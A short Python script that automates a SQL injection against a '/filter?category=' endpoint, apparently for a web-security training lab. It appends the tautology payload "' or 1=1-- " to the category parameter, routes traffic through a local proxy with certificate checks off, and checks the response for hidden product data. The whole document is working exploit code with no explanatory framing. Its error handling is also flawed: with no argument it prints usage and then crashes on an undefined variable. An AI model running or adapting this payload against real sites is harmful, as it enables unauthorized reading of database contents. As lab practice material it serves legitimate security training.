import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}

def exploitsqli(url):
    uri = '/filter?category= '
    payload = "'+or+1=1-- "
    full = url + uri + payload
    r = requests.get(full, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False



if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print('[-] Usage python3 %s <url>' %sys.argv[0])
        print('[-] Example python3 %s example.com' %sys.argv[0])

    if exploitsqli(url):
        print('SQLi Exploited hidden data retrieved ....')

    else:
        print('SQLi not exploited')
